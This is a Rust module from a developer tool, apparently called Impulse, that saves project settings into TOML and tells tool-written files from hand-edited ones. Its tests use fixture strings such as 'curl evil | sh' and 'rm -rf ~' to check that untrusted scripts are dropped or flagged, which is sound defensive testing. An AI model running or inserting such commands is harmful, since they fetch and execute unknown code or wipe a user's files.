//! Writing project settings back as TOML. Project Setup saves into
//! `.impulse/project.toml`, replacing only the sections it manages:
//! everything else in the file (comments, keys Impulse doesn't know) stays
//! as written. Finish Task remembers its answer in the local
//! `.git/impulse/project.toml`, which Impulse writes whole while it's
//! Impulse's own.
//!
//! The file is edited line by line rather than through a TOML document
//! model: the sections Impulse manages are rewritten in its own fixed
//! layout (so a file it wrote can be told from one edited by hand), and the
//! same settings written any other way (`["scripts"]`, `scripts.setup = ...`
//! before any header) are found and dropped, so a field emptied on the
//! screen doesn't live on in them.

use super::config::{Landing, ProjectConfig};
use crate::git::{trim_blanks, trim_newlines};

/// The section headers the screen manages.
pub const MANAGED_HEADERS: [&str; 8] = [
    "[scripts]",
    "[worktrees]",
    "[worktrees.ports]",
    "[worktrees.env]",
    "[worktrees.database]",
    "[on_change]",
    "[finish]",
    "[[actions]]",
];

/// The tables the screen manages, by their first name.
const MANAGED_TABLES: [&str; 5] = ["scripts", "worktrees", "on_change", "finish", "actions"];

fn is_managed(header: &str) -> bool {
    MANAGED_HEADERS.contains(&header)
}

/// `config` as TOML, its sections in a fixed order; settings left at their
/// defaults are left out. A local file written over a committed one
/// (`clearing`) sets what it turns off explicitly (`setup = ""`,
/// `clone = []`), since a key it left out would come from the committed
/// file.
pub fn text(config: &ProjectConfig, clearing: Option<&ProjectConfig>) -> String {
    let defaults = ProjectConfig::default();
    let mut sections: Vec<String> = Vec::new();
    let mut scripts: Vec<String> = Vec::new();
    let mut script = |name: &str, value: &Option<String>, earlier: Option<&Option<String>>| {
        if let Some(value) = value {
            scripts.push(format!("{name} = {}", string(value)));
        } else if earlier.is_some_and(Option::is_some) {
            scripts.push(format!("{name} = \"\""));
        }
    };
    script(
        "setup",
        &config.setup_script,
        clearing.map(|c| &c.setup_script),
    );
    script(
        "check",
        &config.check_script,
        clearing.map(|c| &c.check_script),
    );
    script(
        "archive",
        &config.archive_script,
        clearing.map(|c| &c.archive_script),
    );
    if !scripts.is_empty() {
        sections.push(section("[scripts]", scripts));
    }

    let mut worktrees: Vec<String> = Vec::new();
    let clears = |list: fn(&ProjectConfig) -> bool| clearing.is_some_and(list);
    if !config.worktree_copy.is_empty() || clears(|c| !c.worktree_copy.is_empty()) {
        worktrees.push(format!("copy = {}", array(&config.worktree_copy)));
    }
    if !config.worktree_clone.is_empty() || clears(|c| !c.worktree_clone.is_empty()) {
        worktrees.push(format!("clone = {}", array(&config.worktree_clone)));
    }
    if config.env_file != defaults.env_file {
        worktrees.push(format!("env_file = {}", string(&config.env_file)));
    }
    if config.port_offset != defaults.port_offset {
        worktrees.push(format!("port_offset = {}", config.port_offset));
    }
    if config.compose_override || clearing.is_some_and(|c| c.compose_override) {
        worktrees.push(format!("compose_override = {}", config.compose_override));
    }
    if !config.overlap_ignore.is_empty() || clears(|c| !c.overlap_ignore.is_empty()) {
        worktrees.push(format!(
            "overlap_ignore = {}",
            array(&config.overlap_ignore)
        ));
    }
    if !worktrees.is_empty() {
        sections.push(section("[worktrees]", worktrees));
    }

    if !config.ports.is_empty() {
        let lines = config
            .ports
            .iter()
            .map(|(name, port)| format!("{} = {port}", key(name)));
        sections.push(section("[worktrees.ports]", lines.collect()));
    }
    if !config.worktree_env.is_empty() {
        let lines = config
            .worktree_env
            .iter()
            .map(|(name, value)| format!("{} = {}", key(name), string(value)));
        sections.push(section("[worktrees.env]", lines.collect()));
    }
    if let Some(folder) = &config.database_folder {
        let mut lines = vec![format!("clone = {}", string(folder))];
        if let Some(service) = &config.database_service {
            lines.push(format!("service = {}", string(service)));
        }
        sections.push(section("[worktrees.database]", lines));
    } else if clearing.is_some_and(|c| c.database_folder.is_some()) {
        sections.push("[worktrees.database]\nclone = \"\"".into());
    }
    if !config.on_change.is_empty() {
        let lines = config
            .on_change
            .iter()
            .map(|(name, command)| format!("{} = {}", key(name), string(command)));
        sections.push(section("[on_change]", lines.collect()));
    }
    if let Some(landing) = config.landing {
        sections.push(format!("[finish]\nland = {}", string(landing.as_str())));
    } else if clearing.is_some_and(|c| c.landing.is_some()) {
        sections.push("[finish]\nland = \"\"".into());
    }
    for action in &config.actions {
        let mut lines = vec![
            format!("name = {}", string(&action.name)),
            format!("command = {}", string(&action.command)),
        ];
        if let Some(cwd) = &action.cwd {
            lines.push(format!("cwd = {}", string(cwd)));
        }
        if let Some(open) = &action.open {
            lines.push(format!("open = {}", string(open)));
        }
        sections.push(section("[[actions]]", lines));
    }
    if sections.is_empty() {
        String::new()
    } else {
        sections.join("\n\n") + "\n"
    }
}

fn section(header: &str, lines: Vec<String>) -> String {
    std::iter::once(header.to_string())
        .chain(lines)
        .collect::<Vec<_>>()
        .join("\n")
}

/// `existing` with the managed sections replaced by `config`'s, where the
/// first of them was; the rest of the file stays as written. The same
/// settings written another way go too (`["scripts"]`, or
/// `scripts.setup = ...` before any header), so a field emptied on the
/// screen doesn't live on in them.
pub fn merging(config: &ProjectConfig, existing: &str) -> String {
    let mut parts: Vec<String> = Vec::new();
    let mut insert_at: Option<usize> = None;
    for block in split(existing) {
        if block.header.as_deref().is_some_and(is_managed) {
            insert_at.get_or_insert(parts.len());
            continue;
        }
        let dropped;
        let kept = if block.header.is_none() {
            dropped = dropping_managed_keys(&block.text);
            trim_newlines(&dropped)
        } else {
            trim_newlines(&block.text)
        };
        // Not an empty start of the file: the sections would go after the
        // block that follows it.
        if !kept.is_empty() {
            parts.push(kept.to_string());
        }
    }
    let managed = text(config, None);
    let managed = trim_newlines(&managed);
    if !managed.is_empty() {
        let index = insert_at.unwrap_or(parts.len()).min(parts.len());
        parts.insert(index, managed.to_string());
    }
    if parts.is_empty() {
        String::new()
    } else {
        parts.join("\n\n") + "\n"
    }
}

/// Whether `text` reads as exactly `config`. Project Setup trusts a file it
/// saved only then: `merging` keeps what it doesn't manage as written, and
/// a setting there would otherwise be trusted unseen.
pub fn holds_only(config: &ProjectConfig, text: &str) -> bool {
    ProjectConfig::parse(text).is_ok_and(|read| read == *config)
}

/// `existing` with `[finish] land` set to `landing`, for Finish Task
/// remembering its answer. A file the screen wrote is written again the
/// same way; in any other, only the `[finish]` section changes.
pub fn setting(landing: Landing, existing: &str) -> String {
    if let Ok(mut config) = ProjectConfig::parse(existing) {
        if text(&config, None) == existing {
            config.landing = Some(landing);
            return text(&config, None);
        }
    }
    let section = vec![
        "[finish]".to_string(),
        format!("land = {}", string(landing.as_str())),
    ];
    let mut lines: Vec<String> = existing.split('\n').map(String::from).collect();
    let header_is = |line: &str, name: &str| header(line).as_deref() == Some(name);
    if let Some(start) = lines.iter().position(|l| header_is(l, "[finish]")) {
        let mut end = start + 1;
        while end < lines.len() && header(&lines[end]).is_none() {
            end += 1;
        }
        while end > start + 1 && trim_blanks(&lines[end - 1]).is_empty() {
            end -= 1;
        }
        lines.splice(start..end, section);
    } else if let Some(actions) = lines.iter().position(|l| header_is(l, "[[actions]]")) {
        let mut inserted = section;
        inserted.push(String::new());
        lines.splice(actions..actions, inserted);
    } else {
        while lines.last().is_some_and(|l| trim_blanks(l).is_empty()) {
            lines.pop();
        }
        if !lines.is_empty() {
            lines.push(String::new());
        }
        lines.extend(section);
        lines.push(String::new());
    }
    lines.join("\n")
}

/// Whether `text` is a whole file as `text` writes it (by Project Setup, or
/// Finish Task remembering its answer), so replacing it loses nothing
/// written by hand. A local file may clear settings of the `committed` one.
pub fn is_written_by_impulse(file: &str, committed: Option<&ProjectConfig>) -> bool {
    let Ok(config) = ProjectConfig::parse(file) else {
        return false;
    };
    text(&config, None) == file || text(&config, committed) == file
}

/// Whether the sections a rewrite replaces hold comments it would drop.
pub fn managed_sections_have_comments(file: &str) -> bool {
    split(file).iter().any(|block| {
        block.header.as_deref().is_some_and(is_managed)
            && block
                .text
                .split('\n')
                .skip(1)
                .any(|line| trim_blanks(line).starts_with('#'))
    })
}

/// The keys each managed section can hold; `None` for the tables of names
/// (`[worktrees.ports]`), which hold any. Under `[worktrees]`, `ports`,
/// `env` and `database` start dotted keys of its tables. `Err` for a header
/// the screen doesn't manage.
fn known_keys(header: &str) -> Result<Option<&'static [&'static str]>, ()> {
    Ok(Some(match header {
        "[scripts]" => &["setup", "archive", "check"],
        "[worktrees]" => &[
            "copy",
            "clone",
            "env_file",
            "port_offset",
            "compose_override",
            "overlap_ignore",
            "ports",
            "env",
            "database",
        ],
        "[worktrees.ports]" | "[worktrees.env]" | "[on_change]" => return Ok(None),
        "[worktrees.database]" => &["clone", "service"],
        "[finish]" => &["land"],
        "[[actions]]" => &["name", "command", "cwd", "open"],
        _ => return Err(()),
    }))
}

/// The keys in the managed sections of `file` that Project Setup doesn't
/// know, which a rewrite drops (`scripts.lint`), in file order. That
/// includes ones set before any header (`scripts.lint = ...`).
pub fn unknown_managed_keys(file: &str) -> Vec<String> {
    let mut unknown: Vec<String> = Vec::new();
    for block in split(file) {
        let mut scanner = StatementScanner::default();
        let skip = usize::from(block.header.is_some());
        for line in block.text.split('\n').skip(skip) {
            // A line of a multi-line string or array isn't a key.
            let starts_statement = scanner.is_at_statement_start();
            scanner.scan(line);
            if !starts_statement {
                continue;
            }
            let Some(path) = key_path_of_line(line) else {
                continue;
            };
            let mut parts = path.as_slice();
            let header = match &block.header {
                Some(table) => table.clone(),
                None => {
                    // Before any header, only dotted keys of the screen's
                    // tables.
                    let Some(table) = parts.first() else { continue };
                    if !MANAGED_TABLES.contains(&table.as_str()) || parts.len() < 2 {
                        continue;
                    }
                    let header = if table == "actions" {
                        "[[actions]]".to_string()
                    } else {
                        format!("[{table}]")
                    };
                    parts = &parts[1..];
                    header
                }
            };
            let Ok(Some(known)) = known_keys(&header) else {
                continue;
            };
            let Some(key) = parts.first() else { continue };
            if known.contains(&key.as_str()) {
                continue;
            }
            let name = format!("{}.{key}", header.trim_matches(['[', ']']));
            if !unknown.contains(&name) {
                unknown.push(name);
            }
        }
    }
    unknown
}

/// `text` (the keys before any header) without the statements that set the
/// screen's tables as dotted keys or inline values (`scripts.setup = ...`,
/// `actions = [ ... ]`), however many lines each spans.
fn dropping_managed_keys(text: &str) -> String {
    let mut kept: Vec<&str> = Vec::new();
    let mut scanner = StatementScanner::default();
    let mut dropping = false;
    for line in text.split('\n') {
        if scanner.is_at_statement_start() {
            dropping = key_path_of_line(line)
                .is_some_and(|path| MANAGED_TABLES.contains(&path[0].as_str()));
        }
        scanner.scan(line);
        if !dropping {
            kept.push(line);
        }
    }
    kept.join("\n")
}

/// The parts of the key a line sets, unquoted (`worktrees."ports".APP = 1`
/// to worktrees, ports, APP); `None` for comments, headers and anything
/// else.
fn key_path_of_line(line: &str) -> Option<Vec<String>> {
    let (parts, rest) = key_path(line)?;
    rest.starts_with('=').then_some(parts)
}

/// A dotted key at the start of `text`, unquoted, and what follows it (from
/// its first non-blank character); `None` when it doesn't start with one.
fn key_path(text: &str) -> Option<(Vec<String>, &str)> {
    let blank = |c: char| c == ' ' || c == '\t';
    let mut rest = text.trim_start_matches(blank);
    let mut parts = Vec::new();
    loop {
        if let Some(quote) = rest.chars().next().filter(|&c| c == '"' || c == '\'') {
            let (key, after) = quoted_key(rest, quote)?;
            parts.push(key);
            rest = after;
        } else {
            let bare = rest
                .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
                .unwrap_or(rest.len());
            if bare == 0 {
                return None;
            }
            parts.push(rest[..bare].to_string());
            rest = &rest[bare..];
        }
        rest = rest.trim_start_matches(blank);
        match rest.strip_prefix('.') {
            Some(after) => rest = after.trim_start_matches(blank),
            None => return Some((parts, rest)),
        }
    }
}

/// A quoted key at the start of `text` and what follows it. A basic
/// string's escapes are read as TOML reads them, so `"scripts"` is
/// `scripts`.
fn quoted_key(text: &str, quote: char) -> Option<(String, &str)> {
    let mut rest = &text[1..];
    let mut key = String::new();
    loop {
        let c = rest.chars().next()?;
        rest = &rest[c.len_utf8()..];
        if c == quote {
            return Some((key, rest));
        }
        if quote != '"' || c != '\\' {
            key.push(c);
            continue;
        }
        let Some(escape) = rest.chars().next() else {
            key.push(c);
            continue;
        };
        rest = &rest[escape.len_utf8()..];
        match escape {
            'b' => key.push('\u{8}'),
            't' => key.push('\t'),
            'n' => key.push('\n'),
            'f' => key.push('\u{C}'),
            'r' => key.push('\r'),
            'u' | 'U' => {
                let length = if escape == 'u' { 4 } else { 8 };
                let digits: String = rest.chars().take(length).collect();
                let scalar = u32::from_str_radix(&digits, 16)
                    .ok()
                    .and_then(char::from_u32)?;
                key.push(scalar);
                rest = &rest[digits.len()..];
            }
            other => key.push(other),
        }
    }
}

/// Where a TOML file's statements start: not inside a multi-line string or
/// a value's brackets, which may span lines.
#[derive(Default)]
struct StatementScanner {
    multiline: Option<&'static str>,
    depth: usize,
}

impl StatementScanner {
    fn is_at_statement_start(&self) -> bool {
        self.multiline.is_none() && self.depth == 0
    }

    fn scan(&mut self, line: &str) {
        let chars: Vec<char> = line.chars().collect();
        let starts = |index: usize, text: &str| {
            let mut i = index;
            text.chars().all(|c| {
                let ok = chars.get(i) == Some(&c);
                i += 1;
                ok
            })
        };
        let mut index = 0;
        while index < chars.len() {
            if let Some(delimiter) = self.multiline {
                if starts(index, delimiter) {
                    self.multiline = None;
                    index += 3;
                } else {
                    index += if delimiter == "\"\"\"" && chars[index] == '\\' {
                        2
                    } else {
                        1
                    };
                }
                continue;
            }
            if starts(index, "\"\"\"") {
                self.multiline = Some("\"\"\"");
                index += 3;
                continue;
            }
            if starts(index, "'''") {
                self.multiline = Some("'''");
                index += 3;
                continue;
            }
            match chars[index] {
                '#' => return,
                '"' => {
                    index += 1;
                    while index < chars.len() && chars[index] != '"' {
                        index += if chars[index] == '\\' { 2 } else { 1 };
                    }
                }
                '\'' => {
                    index += 1;
                    while index < chars.len() && chars[index] != '\'' {
                        index += 1;
                    }
                }
                '[' | '{' => self.depth += 1,
                ']' | '}' => self.depth = self.depth.saturating_sub(1),
                _ => {}
            }
            index += 1;
        }
    }
}

struct Block {
    header: Option<String>,
    text: String,
}

/// The file in blocks: what comes before the first header, then each header
/// with the lines under it. A line inside a multi-line value is never a
/// header.
fn split(text: &str) -> Vec<Block> {
    let mut blocks = vec![Block {
        header: None,
        text: String::new(),
    }];
    let mut scanner = StatementScanner::default();
    for line in text.split('\n') {
        let found = if scanner.is_at_statement_start() {
            header(line)
        } else {
            None
        };
        match found {
            Some(header) => blocks.push(Block {
                header: Some(header),
                text: line.to_string(),
            }),
            None => {
                let last = blocks.last_mut().expect("there is always a first block");
                if !last.text.is_empty() {
                    last.text.push('\n');
                }
                last.text.push_str(line);
            }
        }
        scanner.scan(line);
    }
    blocks
}

/// The table header a line starts, as the screen writes it: `[scripts]` for
/// `[ "scripts" ]`, `[[actions]]`; `None` for any other line.
fn header(line: &str) -> Option<String> {
    let trimmed = trim_blanks(line);
    if !trimmed.starts_with('[') {
        return None;
    }
    let is_array = trimmed.starts_with("[[");
    let inner = &trimmed[if is_array { 2 } else { 1 }..];
    if let Some((parts, rest)) = key_path(inner) {
        if rest.starts_with(if is_array { "]]" } else { "]" }) {
            let name = parts.iter().map(|p| key(p)).collect::<Vec<_>>().join(".");
            return Some(if is_array {
                format!("[[{name}]]")
            } else {
                format!("[{name}]")
            });
        }
    }
    let close = trimmed
        .find("]]")
        .map(|i| i + 2)
        .or_else(|| trimmed.find(']').map(|i| i + 1))?;
    Some(trimmed[..close].chars().filter(|&c| c != ' ').collect())
}

/// A TOML basic string. TOML forbids raw control characters in one (a
/// pasted `\r\n`), so every one is escaped.
pub fn string(value: &str) -> String {
    let mut escaped = String::with_capacity(value.len() + 2);
    escaped.push('"');
    for c in value.chars() {
        match c {
            '\\' => escaped.push_str("\\\\"),
            '"' => escaped.push_str("\\\""),
            '\n' => escaped.push_str("\\n"),
            '\t' => escaped.push_str("\\t"),
            '\r' => escaped.push_str("\\r"),
            c if (c as u32) < 0x20 || c == '\u{7F}' => {
                escaped.push_str(&format!("\\u{:04X}", c as u32))
            }
            c => escaped.push(c),
        }
    }
    escaped.push('"');
    escaped
}

fn array(values: &[String]) -> String {
    format!(
        "[{}]",
        values
            .iter()
            .map(|v| string(v))
            .collect::<Vec<_>>()
            .join(", ")
    )
}

/// A key, quoted unless it's a bare key (`APP_PORT`, not `composer.lock`).
fn key(name: &str) -> String {
    let bare = !name.is_empty()
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
    if bare {
        name.to_string()
    } else {
        string(name)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::project::config::{parse_layer, resolve, Action};
    use std::collections::BTreeMap;

    fn map<V: Clone>(items: &[(&str, V)]) -> BTreeMap<String, V> {
        items
            .iter()
            .map(|(k, v)| (k.to_string(), v.clone()))
            .collect()
    }

    fn strings(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    fn everything() -> ProjectConfig {
        ProjectConfig {
            actions: vec![
                Action {
                    open: Some("right".into()),
                    ..Action::new("dev", "npm run dev")
                },
                Action {
                    cwd: Some("web".into()),
                    ..Action::new("say \"hi\"", "echo 'a\\b'")
                },
            ],
            setup_script: Some("docker compose up -d && npm ci".into()),
            archive_script: Some("docker compose down -v".into()),
            worktree_copy: strings(&[".env", "config/*.local.json"]),
            check_script: Some("npx tsc --noEmit\nnpm test".into()),
            worktree_clone: strings(&["vendor", "public/build"]),
            env_file: ".env.local".into(),
            port_offset: 10,
            ports: map(&[("APP_PORT", 8000), ("VITE_PORT", 5173)]),
            worktree_env: map(&[("DB_DATABASE", "pulseboard_{task_}".to_string())]),
            database_folder: Some("docker/data/mysql".into()),
            database_service: Some("mysql".into()),
            compose_override: true,
            on_change: map(&[
                ("composer.lock", "composer install".to_string()),
                ("package-lock.json", "npm ci".to_string()),
            ]),
            landing: Some(Landing::Review),
            ..ProjectConfig::default()
        }
    }

    fn with_setup(setup: &str) -> ProjectConfig {
        ProjectConfig {
            setup_script: Some(setup.into()),
            ..ProjectConfig::default()
        }
    }

    #[test]
    fn what_is_written_reads_back_the_same() {
        let written = text(&everything(), None);
        assert_eq!(ProjectConfig::parse(&written).unwrap(), everything());
        assert!(
            written.contains("\"composer.lock\" = \"composer install\""),
            "dotted names are quoted"
        );
        assert!(written.contains("APP_PORT = 8000"));
        assert_eq!(text(&ProjectConfig::default(), None), "");
    }

    #[test]
    fn defaults_are_left_out() {
        let config = ProjectConfig {
            ports: map(&[("APP_PORT", 8000)]),
            ..with_setup("npm ci")
        };
        assert_eq!(
            text(&config, None),
            "[scripts]\nsetup = \"npm ci\"\n\n[worktrees.ports]\nAPP_PORT = 8000\n"
        );
    }

    #[test]
    fn merging_keeps_what_the_screen_doesnt_manage() {
        let existing = r#"# Trailhead's Impulse settings.

[scripts]
# comments here are replaced
setup = "npm ci"

[lsp]
typescript = true

[[actions]]
name = "old"
command = "echo old""#;
        assert!(managed_sections_have_comments(existing));
        let config = ProjectConfig {
            actions: vec![Action::new("test", "npm test")],
            ports: map(&[("WEB_PORT", 5173)]),
            ..with_setup("pnpm install")
        };
        let merged = merging(&config, existing);
        assert_eq!(
            merged,
            r#"# Trailhead's Impulse settings.

[scripts]
setup = "pnpm install"

[worktrees.ports]
WEB_PORT = 5173

[[actions]]
name = "test"
command = "npm test"

[lsp]
typescript = true
"#
        );
        assert_eq!(
            ProjectConfig::parse(&merged)
                .unwrap()
                .setup_script
                .as_deref(),
            Some("pnpm install")
        );
        assert!(!managed_sections_have_comments(&merged));
    }

    #[test]
    fn a_local_file_turns_off_what_the_committed_one_sets() {
        let committed = ProjectConfig {
            worktree_copy: strings(&[".env"]),
            worktree_clone: strings(&["vendor"]),
            database_folder: Some("docker/data/mysql".into()),
            compose_override: true,
            landing: Some(Landing::Merge),
            ..with_setup("npm ci")
        };
        let local = ProjectConfig {
            archive_script: Some("docker compose down -v".into()),
            ..ProjectConfig::default()
        };
        let written = text(&local, Some(&committed));
        let layered = resolve(&[
            parse_layer(&text(&committed, None)).unwrap(),
            parse_layer(&written).unwrap(),
        ]);
        assert_eq!(layered.setup_script, None);
        assert!(layered.worktree_copy.is_empty());
        assert!(layered.worktree_clone.is_empty());
        assert_eq!(layered.database_folder, None);
        assert!(!layered.compose_override);
        assert_eq!(layered.landing, None, "Finish asks again");
        assert_eq!(
            layered.archive_script.as_deref(),
            Some("docker compose down -v")
        );
    }

    #[test]
    fn files_impulse_wrote_are_told_from_hand_edited_ones() {
        let committed = ProjectConfig {
            landing: Some(Landing::Merge),
            ..with_setup("npm ci")
        };
        let local = ProjectConfig {
            archive_script: Some("docker compose down -v".into()),
            ..ProjectConfig::default()
        };
        assert!(is_written_by_impulse(&text(&everything(), None), None));
        assert!(is_written_by_impulse(
            &text(&local, Some(&committed)),
            Some(&committed)
        ));
        assert!(
            is_written_by_impulse(&setting(Landing::Review, ""), None),
            "Finish's answer"
        );
        assert!(is_written_by_impulse("", None));
        assert!(!is_written_by_impulse(
            &format!("# mine\n{}", text(&local, None)),
            None
        ));
        assert!(!is_written_by_impulse(
            "[scripts]\nsetup = 'npm ci'\n",
            None
        ));
        assert!(!is_written_by_impulse("[scripts", None));
    }

    #[test]
    fn finishs_answer_is_saved_without_disturbing_the_file() {
        // A file the screen wrote is written the screen's way.
        let written = text(
            &ProjectConfig {
                actions: vec![Action::new("dev", "npm run dev")],
                ..with_setup("npm ci")
            },
            None,
        );
        let saved = setting(Landing::Merge, &written);
        assert_eq!(
            saved,
            text(&ProjectConfig::parse(&saved).unwrap(), None),
            "still the screen's own"
        );
        assert!(saved.contains("[finish]\nland = \"merge\"\n\n[[actions]]"));

        // Anything else keeps its comments and order; an earlier answer is
        // replaced.
        let edited = r#"# by hand
[scripts]
setup = "npm ci" # install

[finish]
land = "review"

[[actions]]
name = "dev"
command = "npm run dev""#;
        let changed = setting(Landing::Merge, edited);
        assert!(changed.contains("# by hand\n[scripts]\nsetup = \"npm ci\" # install"));
        assert_eq!(changed.matches("[finish]").count(), 1);
        let parsed = ProjectConfig::parse(&changed).unwrap();
        assert_eq!(parsed.landing, Some(Landing::Merge));
        assert_eq!(
            parsed
                .actions
                .iter()
                .map(|a| a.name.as_str())
                .collect::<Vec<_>>(),
            ["dev"]
        );
        assert_eq!(
            setting(Landing::Review, ""),
            "[finish]\nland = \"review\"\n"
        );
        assert_eq!(
            setting(Landing::Merge, "[lsp]\nx = 1\n\n"),
            "[lsp]\nx = 1\n\n[finish]\nland = \"merge\"\n"
        );
    }

    #[test]
    fn keys_the_screen_doesnt_know_are_named() {
        let file = r#"top = 1

[scripts]
setup = "npm ci"
lint = "eslint ."
"check" = """
not = a key
"""

[worktrees]
copy = [
  ".env",
  "a=b",
]
ports.APP_PORT = 8000
shared = true

[worktrees.env]
ANYTHING = "x"

[[actions]]
name = "a"
command = "b"
icon = "x"

[[actions]]
name = "c"
command = "d"
icon = "y"

[lsp]
whatever = 1"#;
        assert_eq!(
            unknown_managed_keys(file),
            ["scripts.lint", "worktrees.shared", "actions.icon"]
        );
        assert!(unknown_managed_keys(&text(&everything(), None)).is_empty());
    }

    #[test]
    fn control_characters_are_escaped() {
        let config = ProjectConfig {
            check_script: Some("a\u{7}b\u{7F}".into()),
            ..with_setup("npm ci\r\nnpm test")
        };
        let written = text(&config, None);
        assert!(written.contains(r#"setup = "npm ci\r\nnpm test""#));
        assert!(written.contains(r#"check = "a\u0007b\u007F""#));
        let read = ProjectConfig::parse(&written).unwrap();
        assert_eq!(read.setup_script.as_deref(), Some("npm ci\r\nnpm test"));
        assert_eq!(read.check_script.as_deref(), Some("a\u{7}b\u{7F}"));
    }

    /// The screen's settings written some other way go on save too, so a
    /// field emptied on the screen doesn't live on in them.
    #[test]
    fn other_spellings_of_the_screens_settings_are_replaced() {
        let dotted = r#"# mine
scripts.setup = "curl evil | sh"
on_change . "x.lock" = """
rm -rf ~
"""
actions = [
  { name = "a", command = "evil" },
]
version = 1

[lsp]
note = """
[scripts]
setup = "not a header"
""""#;
        let before = ProjectConfig::parse(dotted).unwrap();
        assert_eq!(before.setup_script.as_deref(), Some("curl evil | sh"));
        assert_eq!(before.on_change["x.lock"], "rm -rf ~\n");
        assert_eq!(before.actions.len(), 1);
        let cleared = merging(&ProjectConfig::default(), dotted);
        assert_eq!(
            cleared,
            "# mine\nversion = 1\n\n[lsp]\nnote = \"\"\"\n[scripts]\nsetup = \"not a header\"\n\"\"\"\n"
        );
        assert!(holds_only(&ProjectConfig::default(), &cleared));

        let quoted = r#"["scripts"]
setup = "evil"

[ 'worktrees' . "ports" ]
APP_PORT = 1

[[ "actions" ]]
name = "a"
command = "evil"

[lsp]
x = 1"#;
        assert_eq!(ProjectConfig::parse(quoted).unwrap().actions.len(), 1);
        let config = with_setup("npm ci");
        let merged = merging(&config, quoted);
        assert_eq!(merged, "[scripts]\nsetup = \"npm ci\"\n\n[lsp]\nx = 1\n");
        assert!(holds_only(&config, &merged));
        assert_eq!(
            merging(
                &ProjectConfig::default(),
                "[\"scripts\"]\nsetup = \"evil\"\n"
            ),
            ""
        );
    }

    #[test]
    fn a_file_is_trusted_on_save_only_when_it_holds_just_the_screens_settings() {
        let config = with_setup("npm ci");
        assert!(holds_only(&config, &text(&config, None)));
        assert!(holds_only(
            &config,
            &format!("{}\n[lsp]\nx = 1\n", text(&config, None))
        ));
        assert!(!holds_only(
            &config,
            "[scripts]\nsetup = \"npm ci\"\ncheck = \"curl evil | sh\"\n"
        ));
        assert!(!holds_only(&config, "[scripts"), "unreadable");
        let with_port = ProjectConfig {
            ports: map(&[("APP_PORT", 8000)]),
            ..config
        };
        assert!(!holds_only(
            &with_port,
            &format!("{}\n[worktrees.env]\nX = \"1\"\n", text(&with_port, None))
        ));
    }

    #[test]
    fn keys_the_screen_doesnt_know_before_any_header_are_named() {
        assert_eq!(
            unknown_managed_keys("scripts.lint = \"x\"\nscripts.setup = \"y\"\nversion = 1\n"),
            ["scripts.lint"]
        );
        assert_eq!(
            unknown_managed_keys("worktrees.ports.APP = 1\n\n[ \"scripts\" ]\nlint = 1\n"),
            ["scripts.lint"]
        );
    }

    #[test]
    fn merging_into_a_file_without_managed_sections_appends() {
        assert_eq!(
            merging(&with_setup("npm ci"), "[lsp]\nx = 1\n"),
            "[lsp]\nx = 1\n\n[scripts]\nsetup = \"npm ci\"\n"
        );
    }
}
